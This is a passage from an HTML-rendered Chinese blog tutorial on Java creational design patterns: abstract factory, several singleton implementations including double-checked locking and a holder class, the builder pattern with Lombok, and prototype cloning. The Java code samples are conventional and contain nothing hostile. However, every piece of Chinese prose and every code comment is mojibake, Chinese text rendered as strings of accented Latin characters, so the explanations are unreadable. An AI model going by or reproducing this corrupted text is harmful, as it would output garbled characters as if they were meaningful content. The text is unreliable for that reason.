ä¸»æ¿</span></span><br><span class="line">    <span class="type">MainBoard</span> <span class="variable">board</span> <span class="operator">=</span> cf.makeMainBoard();</span><br><span class="line">  <span class="comment">// ä»è¿™ä¸ªå¤§å‚é€ ç¡¬ç›˜</span></span><br><span class="line">  <span class="type">HardDisk</span> <span class="variable">hardDisk</span> <span class="operator">=</span> cf.makeHardDisk();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å°†åŒä¸€ä¸ªå‚å­å‡ºæ¥çš„ CPUã€ä¸»æ¿ã€ç¡¬ç›˜ç»„è£…åœ¨ä¸€èµ·</span></span><br><span class="line">    <span class="type">Computer</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Computer</span>(cpu, board, hardDisk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼ŒæŠ½è±¡å·¥å‚çš„é—®é¢˜ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬è¦åŠ ä¸ªæ˜¾ç¤ºå™¨ï¼Œå°±éœ€è¦ä¿®æ”¹æ‰€æœ‰çš„å·¥å‚ï¼Œç»™æ‰€æœ‰çš„å·¥å‚éƒ½åŠ ä¸Šåˆ¶é€ æ˜¾ç¤ºå™¨çš„æ–¹æ³•ã€‚è¿™æœ‰ç‚¹è¿åäº†<strong>å¯¹ä¿®æ”¹å…³é—­ï¼Œå¯¹æ‰©å±•å¼€æ”¾</strong>è¿™ä¸ªè®¾è®¡åŸåˆ™ã€‚</p><h3><span id="å•ä¾‹æ¨¡å¼">å•ä¾‹æ¨¡å¼</span></h3><p>å•ä¾‹æ¨¡å¼ç”¨å¾—æœ€å¤šï¼Œé”™å¾—æœ€å¤šã€‚</p><p>é¥¿æ±‰æ¨¡å¼æœ€ç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="comment">// é¦–å…ˆï¼Œå°† new Singleton() å µæ­»</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;;</span><br><span class="line">    <span class="comment">// åˆ›å»ºç§æœ‰é™æ€å®ä¾‹ï¼Œæ„å‘³ç€è¿™ä¸ªç±»ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„æ—¶å€™å°±ä¼šè¿›è¡Œåˆ›å»º</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// çå†™ä¸€ä¸ªé™æ€æ–¹æ³•ã€‚è¿™é‡Œæƒ³è¯´çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åªæ˜¯è¦è°ƒç”¨ Singleton.getDate(...)ï¼Œ</span></span><br><span class="line">    <span class="comment">// æœ¬æ¥æ˜¯ä¸æƒ³è¦ç”Ÿæˆ Singleton å®ä¾‹çš„ï¼Œä¸è¿‡æ²¡åŠæ³•ï¼Œå·²ç»ç”Ÿæˆäº†</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Date <span class="title function_">getDate</span><span class="params">(String mode)</span> &#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å¾ˆå¤šäººéƒ½èƒ½è¯´å‡ºé¥¿æ±‰æ¨¡å¼çš„ç¼ºç‚¹ï¼Œå¯æ˜¯æˆ‘è§‰å¾—ç”Ÿäº§è¿‡ç¨‹ä¸­ï¼Œå¾ˆå°‘ç¢°åˆ°è¿™ç§æƒ…å†µï¼šä½ å®šä¹‰äº†ä¸€ä¸ªå•ä¾‹çš„ç±»ï¼Œä¸éœ€è¦å…¶å®ä¾‹ï¼Œå¯æ˜¯ä½ å´æŠŠä¸€ä¸ªæˆ–å‡ ä¸ªä½ ä¼šç”¨åˆ°çš„é™æ€æ–¹æ³•å¡åˆ°è¿™ä¸ªç±»ä¸­ã€‚</p></blockquote><p>é¥±æ±‰æ¨¡å¼æœ€å®¹æ˜“å‡ºé”™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="comment">// é¦–å…ˆï¼Œä¹Ÿæ˜¯å…ˆå µæ­» new Singleton() è¿™æ¡è·¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// å’Œé¥¿æ±‰æ¨¡å¼ç›¸æ¯”ï¼Œè¿™è¾¹ä¸éœ€è¦å…ˆå®ä¾‹åŒ–å‡ºæ¥ï¼Œæ³¨æ„è¿™é‡Œçš„ volatileï¼Œå®ƒæ˜¯å¿…é¡»çš„</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// åŠ é”</span></span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="comment">// è¿™ä¸€æ¬¡åˆ¤æ–­ä¹Ÿæ˜¯å¿…é¡»çš„ï¼Œä¸ç„¶ä¼šæœ‰å¹¶å‘é—®é¢˜</span></span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>åŒé‡æ£€æŸ¥ï¼ŒæŒ‡çš„æ˜¯ä¸¤æ¬¡æ£€æŸ¥ instance æ˜¯å¦ä¸º nullã€‚</p><p>volatile åœ¨è¿™é‡Œæ˜¯éœ€è¦çš„ï¼Œå¸Œæœ›èƒ½å¼•èµ·è¯»è€…çš„å…³æ³¨ã€‚</p><p>å¾ˆå¤šäººä¸çŸ¥é“æ€ä¹ˆå†™ï¼Œç›´æ¥å°±åœ¨ getInstance() æ–¹æ³•ç­¾åä¸ŠåŠ ä¸Š synchronizedï¼Œè¿™å°±ä¸å¤šè¯´äº†ï¼Œæ€§èƒ½å¤ªå·®ã€‚</p></blockquote><p>åµŒå¥—ç±»æœ€ç»å…¸ï¼Œä»¥åå¤§å®¶å°±ç”¨å®ƒå§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton3</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// ä¸»è¦æ˜¯ä½¿ç”¨äº† åµŒå¥—ç±»å¯ä»¥è®¿é—®å¤–éƒ¨ç±»çš„é™æ€å±æ€§å’Œé™æ€æ–¹æ³• çš„ç‰¹æ€§</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Holder</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton3</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton3 <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Holder.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼Œå¾ˆå¤šäººéƒ½ä¼šæŠŠè¿™ä¸ª<strong>åµŒå¥—ç±»</strong>è¯´æˆæ˜¯<strong>é™æ€å†…éƒ¨ç±»</strong>ï¼Œä¸¥æ ¼åœ°è¯´ï¼Œå†…éƒ¨ç±»å’ŒåµŒå¥—ç±»æ˜¯ä¸ä¸€æ ·çš„ï¼Œå®ƒä»¬èƒ½è®¿é—®çš„å¤–éƒ¨ç±»æƒé™ä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ã€‚</p></blockquote><p>æœ€åï¼Œæˆ‘ä»¬è¯´ä¸€ä¸‹æšä¸¾ï¼Œæšä¸¾å¾ˆç‰¹æ®Šï¼Œå®ƒåœ¨ç±»åŠ è½½çš„æ—¶å€™ä¼šåˆå§‹åŒ–é‡Œé¢çš„æ‰€æœ‰çš„å®ä¾‹ï¼Œè€Œä¸” JVM ä¿è¯äº†å®ƒä»¬ä¸ä¼šå†è¢«å®ä¾‹åŒ–ï¼Œæ‰€ä»¥å®ƒå¤©ç”Ÿå°±æ˜¯å•ä¾‹çš„ã€‚</p><p>è™½ç„¶æˆ‘ä»¬å¹³æ—¶å¾ˆå°‘çœ‹åˆ°ç”¨æšä¸¾æ¥å®ç°å•ä¾‹ï¼Œä½†æ˜¯åœ¨ RxJava çš„æºç ä¸­ï¼Œæœ‰å¾ˆå¤šåœ°æ–¹éƒ½ç”¨äº†æšä¸¾æ¥å®ç°å•ä¾‹ã€‚</p><h3><span id="å»ºé€ è€…æ¨¡å¼">å»ºé€ è€…æ¨¡å¼</span></h3><p>ç»å¸¸ç¢°è§çš„ XxxBuilder çš„ç±»ï¼Œé€šå¸¸éƒ½æ˜¯å»ºé€ è€…æ¨¡å¼çš„äº§ç‰©ã€‚å»ºé€ è€…æ¨¡å¼å…¶å®æœ‰å¾ˆå¤šçš„å˜ç§ï¼Œä½†æ˜¯å¯¹äºå®¢æˆ·ç«¯æ¥è¯´ï¼Œæˆ‘ä»¬çš„ä½¿ç”¨é€šå¸¸éƒ½æ˜¯ä¸€ä¸ªæ¨¡å¼çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Food</span> <span class="variable">food</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FoodBuilder</span>().a().b().c().build();</span><br><span class="line"><span class="type">Food</span> <span class="variable">food</span> <span class="operator">=</span> Food.builder().a().b().c().build();</span><br></pre></td></tr></table></figure><p>å¥—è·¯å°±æ˜¯å…ˆ new ä¸€ä¸ª Builderï¼Œç„¶åå¯ä»¥é“¾å¼åœ°è°ƒç”¨ä¸€å †æ–¹æ³•ï¼Œæœ€åå†è°ƒç”¨ä¸€æ¬¡ build() æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦çš„å¯¹è±¡å°±æœ‰äº†ã€‚</p><p>æ¥ä¸€ä¸ªä¸­è§„ä¸­çŸ©çš„å»ºé€ è€…æ¨¡å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// ä¸‹é¢æ˜¯â€œä¸€å †â€çš„å±æ€§</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String nickName;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ æ–¹æ³•ç§æœ‰åŒ–ï¼Œä¸ç„¶å®¢æˆ·ç«¯å°±ä¼šç›´æ¥è°ƒç”¨æ„é€ æ–¹æ³•äº†</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">User</span><span class="params">(String name, String password, String nickName, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">        <span class="built_in">this</span>.nickName = nickName;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// é™æ€æ–¹æ³•ï¼Œç”¨äºç”Ÿæˆä¸€ä¸ª Builderï¼Œè¿™ä¸ªä¸ä¸€å®šè¦æœ‰ï¼Œä¸è¿‡å†™è¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¹ æƒ¯ï¼Œ</span></span><br><span class="line">    <span class="comment">// æœ‰äº›ä»£ç è¦æ±‚åˆ«äººå†™ new User.UserBuilder().a()...build() çœ‹ä¸Šå»å°±æ²¡é‚£ä¹ˆå¥½</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> UserBuilder <span class="title function_">builder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserBuilder</span>();</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">UserBuilder</span> &#123;</span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯å’Œ User ä¸€æ¨¡ä¸€æ ·çš„ä¸€å †å±æ€§</span></span><br><span class="line">        <span class="keyword">private</span> String  name;</span><br><span class="line">        <span class="keyword">private</span> String password;</span><br><span class="line">        <span class="keyword">private</span> String nickName;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="title function_">UserBuilder</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é“¾å¼è°ƒç”¨è®¾ç½®å„ä¸ªå±æ€§å€¼ï¼Œè¿”å› thisï¼Œå³ UserBuilder</span></span><br><span class="line">        <span class="keyword">public</span> UserBuilder <span class="title function_">name</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> UserBuilder <span class="title function_">password</span><span class="params">(String password)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.password = password;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> UserBuilder <span class="title function_">nickName</span><span class="params">(String nickName)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.nickName = nickName;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> UserBuilder <span class="title function_">age</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// build() æ–¹æ³•è´Ÿè´£å°† UserBuilder ä¸­è®¾ç½®å¥½çš„å±æ€§â€œå¤åˆ¶â€åˆ° User ä¸­ã€‚</span></span><br><span class="line">        <span class="comment">// å½“ç„¶ï¼Œå¯ä»¥åœ¨ â€œå¤åˆ¶â€ ä¹‹å‰åšç‚¹æ£€éªŒ</span></span><br><span class="line">        <span class="keyword">public</span> User <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (name == <span class="literal">null</span> || password == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;ç”¨æˆ·åå’Œå¯†ç å¿…å¡«&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (age &lt;= <span class="number">0</span> || age &gt;= <span class="number">150</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;å¹´é¾„ä¸åˆæ³•&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è¿˜å¯ä»¥åšèµ‹äºˆâ€é»˜è®¤å€¼â€œçš„åŠŸèƒ½</span></span><br><span class="line">          <span class="keyword">if</span> (nickName == <span class="literal">null</span>) &#123;</span><br><span class="line">                nickName = name;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(name, password, nickName, age);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒæ˜¯ï¼šå…ˆæŠŠæ‰€æœ‰çš„å±æ€§éƒ½è®¾ç½®ç»™ Builderï¼Œç„¶å build() æ–¹æ³•çš„æ—¶å€™ï¼Œå°†è¿™äº›å±æ€§<strong>å¤åˆ¶</strong>ç»™å®é™…äº§ç”Ÿçš„å¯¹è±¡ã€‚</p><p>çœ‹çœ‹å®¢æˆ·ç«¯çš„è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">d</span> <span class="operator">=</span> User.builder()</span><br><span class="line">                .name(<span class="string">&quot;foo&quot;</span>)</span><br><span class="line">                .password(<span class="string">&quot;pAss12345&quot;</span>)</span><br><span class="line">                .age(<span class="number">25</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯´å®è¯ï¼Œå»ºé€ è€…æ¨¡å¼çš„<strong>é“¾å¼</strong>å†™æ³•å¾ˆå¸å¼•äººï¼Œä½†æ˜¯ï¼Œå¤šå†™äº†å¾ˆå¤šâ€œæ— ç”¨â€çš„ builder çš„ä»£ç ï¼Œæ„Ÿè§‰è¿™ä¸ªæ¨¡å¼æ²¡ä»€ä¹ˆç”¨ã€‚ä¸è¿‡ï¼Œå½“å±æ€§å¾ˆå¤šï¼Œè€Œä¸”æœ‰äº›å¿…å¡«ï¼Œæœ‰äº›é€‰å¡«çš„æ—¶å€™ï¼Œè¿™ä¸ªæ¨¡å¼ä¼šä½¿ä»£ç æ¸…æ™°å¾ˆå¤šã€‚æˆ‘ä»¬å¯ä»¥åœ¨ <strong>Builder çš„æ„é€ æ–¹æ³•</strong>ä¸­å¼ºåˆ¶è®©è°ƒç”¨è€…æä¾›å¿…å¡«å­—æ®µï¼Œè¿˜æœ‰ï¼Œåœ¨ build() æ–¹æ³•ä¸­æ ¡éªŒå„ä¸ªå‚æ•°æ¯”åœ¨ User çš„æ„é€ æ–¹æ³•ä¸­æ ¡éªŒï¼Œä»£ç è¦ä¼˜é›…ä¸€äº›ã€‚</p><blockquote><p>é¢˜å¤–è¯ï¼Œå¼ºçƒˆå»ºè®®è¯»è€…ä½¿ç”¨ lombokï¼Œç”¨äº† lombok ä»¥åï¼Œä¸Šé¢çš„ä¸€å¤§å †ä»£ç ä¼šå˜æˆå¦‚ä¸‹è¿™æ ·:</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String  name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String nickName;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ€ä¹ˆæ ·ï¼Œçœä¸‹æ¥çš„æ—¶é—´æ˜¯ä¸æ˜¯åˆå¯ä»¥å¹²ç‚¹åˆ«çš„äº†ã€‚</p></blockquote><p>å½“ç„¶ï¼Œå¦‚æœä½ åªæ˜¯æƒ³è¦é“¾å¼å†™æ³•ï¼Œä¸æƒ³è¦å»ºé€ è€…æ¨¡å¼ï¼Œæœ‰ä¸ªå¾ˆç®€å•çš„åŠæ³•ï¼ŒUser çš„ getter æ–¹æ³•ä¸å˜ï¼Œæ‰€æœ‰çš„ setter æ–¹æ³•éƒ½è®©å…¶ <strong>return this</strong> å°±å¯ä»¥äº†ï¼Œç„¶åå°±å¯ä»¥åƒä¸‹é¢è¿™æ ·è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>().setName(<span class="string">&quot;&quot;</span>).setPassword(<span class="string">&quot;&quot;</span>).setAge(<span class="number">20</span>);</span><br></pre></td></tr></table></figure><blockquote><p>å¾ˆå¤šäººæ˜¯è¿™ä¹ˆç”¨çš„ï¼Œä½†æ˜¯ç¬”è€…è§‰å¾—å…¶å®è¿™ç§å†™æ³•éå¸¸åœ°ä¸ä¼˜é›…ï¼Œä¸æ˜¯å¾ˆæ¨èä½¿ç”¨ã€‚</p></blockquote><h3><span id="åŸå‹æ¨¡å¼">åŸå‹æ¨¡å¼</span></h3><p>è¿™æ˜¯æˆ‘è¦è¯´çš„åˆ›å»ºå‹æ¨¡å¼çš„æœ€åä¸€ä¸ªè®¾è®¡æ¨¡å¼äº†ã€‚</p><p>åŸå‹æ¨¡å¼å¾ˆç®€å•ï¼šæœ‰ä¸€ä¸ªåŸå‹<strong>å®ä¾‹</strong>ï¼ŒåŸºäºè¿™ä¸ªåŸå‹å®ä¾‹äº§ç”Ÿæ–°çš„å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯â€œå…‹éš†â€äº†ã€‚</p><p>Object ç±»ä¸­æœ‰ä¸€ä¸ª clone() æ–¹æ³•ï¼Œå®ƒç”¨äºç”Ÿæˆä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå½“ç„¶ï¼Œå¦‚æœæˆ‘ä»¬è¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œjava è¦æ±‚æˆ‘ä»¬çš„ç±»å¿…é¡»å…ˆ<strong>å®ç° Cloneable æ¥å£</strong>ï¼Œæ­¤æ¥å£æ²¡æœ‰å®šä¹‰ä»»ä½•æ–¹æ³•ï¼Œä½†æ˜¯ä¸è¿™ä¹ˆåšçš„è¯ï¼Œåœ¨ clone() çš„æ—¶å€™ï¼Œä¼šæŠ›å‡º CloneNotSupportedException å¼‚å¸¸ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">native</span> Object <span class="title function_">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException;</span><br></pre></td></tr></table></figure><blockquote><p>java çš„å…‹éš†æ˜¯æµ…å…‹éš†ï¼Œç¢°åˆ°å¯¹è±¡å¼•ç”¨çš„æ—¶å€™ï¼Œå…‹éš†å‡ºæ¥çš„å¯¹è±¡å’ŒåŸå¯¹è±¡ä¸­çš„å¼•ç”¨å°†æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ã€‚é€šå¸¸å®ç°æ·±å…‹éš†çš„æ–¹æ³•æ˜¯å°†å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åå†è¿›è¡Œååºåˆ—åŒ–ã€‚</p></blockquote><p>åŸå‹æ¨¡å¼äº†è§£åˆ°è¿™é‡Œæˆ‘è§‰å¾—å°±å¤Ÿäº†ï¼Œå„ç§å˜ç€æ³•å­è¯´è¿™ç§ä»£ç æˆ–é‚£ç§ä»£ç æ˜¯åŸå‹æ¨¡å¼ï¼Œæ²¡ä»€ä¹ˆæ„ä¹‰ã€‚</p><h3><span id="åˆ›å»ºå‹æ¨¡å¼æ€»ç»“">åˆ›å»ºå‹æ¨¡å¼æ€»ç»“</span></h3><p>åˆ›å»ºå‹æ¨¡å¼æ€»ä½“ä¸Šæ¯”è¾ƒç®€å•ï¼Œå®ƒä»¬çš„ä½œç”¨å°±æ˜¯ä¸ºäº†äº§ç”Ÿå®ä¾‹å¯¹è±¡ï¼Œç®—æ˜¯å„ç§å·¥ä½œçš„ç¬¬ä¸€æ­¥äº†ï¼Œå› ä¸ºæˆ‘ä»¬å†™çš„æ˜¯<strong>é¢å‘å¯¹è±¡</strong>çš„ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬ä¸€æ­¥å½“ç„¶æ˜¯éœ€è¦åˆ›å»ºä¸€ä¸ªå¯¹è±¡äº†ã€‚</p><p>ç®€å•å·¥å‚æ¨¡å¼æœ€ç®€å•ï¼›å·¥å‚æ¨¡å¼åœ¨ç®€å•å·¥å‚æ¨¡å¼çš„åŸºç¡€ä¸Šå¢åŠ äº†é€‰æ‹©å·¥å‚çš„ç»´åº¦ï¼Œéœ€è¦ç¬¬ä¸€æ­¥é€‰æ‹©åˆé€‚çš„å·¥å‚ï¼›æŠ½è±¡å·¥å‚æ¨¡å¼æœ‰äº§å“æ—çš„æ¦‚å¿µï¼Œå¦‚æœå„ä¸ªäº§å“æ˜¯å­˜åœ¨å…¼å®¹æ€§é—®é¢˜çš„ï¼Œå°±è¦ç”¨æŠ½è±¡å·¥å‚æ¨¡å¼ã€‚å•ä¾‹æ¨¡å¼å°±ä¸è¯´äº†ï¼Œä¸ºäº†ä¿è¯å…¨å±€ä½¿ç”¨çš„æ˜¯åŒä¸€å¯¹è±¡ï¼Œä¸€æ–¹é¢æ˜¯å®‰å…¨æ€§è€ƒè™‘ï¼Œä¸€æ–¹é¢æ˜¯ä¸ºäº†èŠ‚çœèµ„æºï¼›å»ºé€ è€…æ¨¡å¼ä¸“é—¨å¯¹ä»˜å±æ€§å¾ˆå¤šçš„é‚£ç§ç±»ï¼Œä¸ºäº†è®©ä»£ç 